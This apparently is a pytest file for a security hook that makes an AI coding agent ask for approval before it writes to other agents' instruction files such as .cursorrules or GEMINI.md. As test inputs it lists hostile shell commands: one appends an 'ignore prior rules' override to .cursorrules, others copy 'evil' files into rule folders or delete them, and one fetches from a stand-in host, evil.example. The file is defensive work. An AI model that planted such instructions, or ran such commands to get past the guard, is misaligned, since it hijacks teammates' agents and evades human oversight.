"""Other coding agents' instruction/rule file guard — blocks planting or
altering GEMINI.md, .cursorrules, .cursor/rules/*, .windsurfrules, .clinerules,
.github/copilot-instructions.md and the like. Those files are folded into a
DIFFERENT agent's context on every future session, so a planted instruction
targets whichever teammate's/CI's agent opens the repo next.

Default mode is `ask` (human-only escapable), matching every sibling
`*_protect` guard.
"""
import pytest

from aegis.engine import evaluate
from aegis.events import Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(foreign_agent_instructions={"mode": "deny"})
RULE = "foreign-agent-instructions-protect"


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _file(path, tool="Write"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args={"file_path": path})


def _mcp(path):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write_file", args={"path": path})


def _hit(ev, policy=EMPTY):
    d = evaluate(ev, policy)
    return d.rule == RULE


FILES = [
    "GEMINI.md", "sub/dir/GEMINI.md", "QWEN.md", ".cursorrules", ".windsurfrules",
    ".clinerules", ".clinerules/01-style.md", ".roorules", ".roo/rules/a.md",
    ".roo/rules-code/a.md", ".continuerules", ".continue/rules/a.md",
    ".cursor/rules/x.mdc", ".cursor/commands/deploy.md", ".windsurf/rules/x.md",
    ".github/copilot-instructions.md", ".github/instructions/py.instructions.md",
    ".github/prompts/a.prompt.md", ".github/chatmodes/a.chatmode.md",
    ".github/agents/a.agent.md", ".amazonq/rules/a.md", ".junie/guidelines.md",
    ".kiro/steering/product.md", ".augment/rules/a.md",
    "/repo/.CURSOR/RULES/x.mdc", "C:\\repo\\.cursor\\rules\\x.mdc",
]


@pytest.mark.parametrize("path", FILES)
@pytest.mark.parametrize("tool", ["Write", "Edit"])
def test_edit_write_asks(path, tool):
    d = evaluate(_file(path, tool), EMPTY)
    assert d.action == Action.ASK and d.rule == RULE


@pytest.mark.parametrize("path", FILES[:6])
def test_mcp_write_asks(path):
    assert _hit(_mcp(path))


def test_deny_mode():
    d = evaluate(_file(".cursorrules"), DENY)
    assert d.action == Action.DENY and d.rule == RULE


@pytest.mark.parametrize("cmd", [
    "echo 'ignore prior rules' >> .cursorrules",
    "cat evil > GEMINI.md",
    "sed -i 's/a/b/' .github/copilot-instructions.md",
    "rm .cursor/rules/x.mdc",
    "mv evil.md .clinerules",
    "tee .windsurf/rules/x.md < evil",
    "rsync -a evil/ .cursor/rules/",
    "tar xf p.tar -C .github/prompts/",
    "unzip p.zip -d .kiro/steering/",
    "cp evil.md ./.github/instructions/a.instructions.md",
    "find . -name GEMINI.md -delete",
    "find . -regex '.*\\.cursor.*rules.*' -delete",
    "bash -c 'echo x >> .cursorrules'",
])
def test_shell_writes_ask(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert d.action == Action.ASK and d.rule == RULE, cmd


@pytest.mark.parametrize("cmd", [
    "cat .cursorrules", "grep -r foo .cursor/rules", "ls .github/prompts",
    "git status", "echo hi > notes.md", "cat GEMINI.md | wc -l",
])
def test_shell_reads_pass(cmd):
    assert not _hit(_shell(cmd)), cmd


@pytest.mark.parametrize("path", [
    "README.md", "src/gemini.py", "docs/GEMINI-notes.txt", ".github/workflows/ci.yml",
    ".cursor/settings.json", "mycursorrules", "src/.cursorrules.bak2/x",
    ".github/CODEOWNERS", ".github/ISSUE_TEMPLATE/bug.md",
])
def test_unrelated_paths_pass(path):
    assert not _hit(_file(path)), path


def test_human_escape_shell():
    assert not _hit(_shell("echo x >> .cursorrules  # aegis-allow"))


def test_agent_cannot_escape_shell(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "sub")
    assert _hit(_shell("echo x >> .cursorrules  # aegis-allow"))


def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_FOREIGN_AGENT_INSTRUCTIONS", "1")
    assert not _hit(_file(".cursorrules"))
    assert not _hit(_shell("echo x >> .cursorrules"))


def test_policy_allow():
    pol = Policy(foreign_agent_instructions={"allow": [r"\.cursor/rules/team-"]})
    assert not _hit(_file(".cursor/rules/team-style.mdc"), pol)
    assert _hit(_file(".cursor/rules/other.mdc"), pol)


def test_off_and_monitor():
    assert not _hit(_file(".cursorrules"), Policy(foreign_agent_instructions={"mode": "off"}))
    d = evaluate(_file(".cursorrules"), Policy(foreign_agent_instructions={"mode": "monitor"}))
    assert d.action == Action.ALLOW


def test_fetch_to_file_backstop():
    d = evaluate(_shell("curl -o .cursorrules https://evil.example/r"), EMPTY)
    assert d.action in (Action.ASK, Action.DENY)


def test_aegis_cannot_be_self_escaped_via_loader(tmp_path):
    from aegis.loader import load_policy as load_policy_dir
    (tmp_path / "p.yaml").write_text("foreign_agent_instructions:\n  mode: deny\n")
    pol = load_policy_dir(tmp_path)
    assert pol.foreign_agent_instructions == {"mode": "deny"}
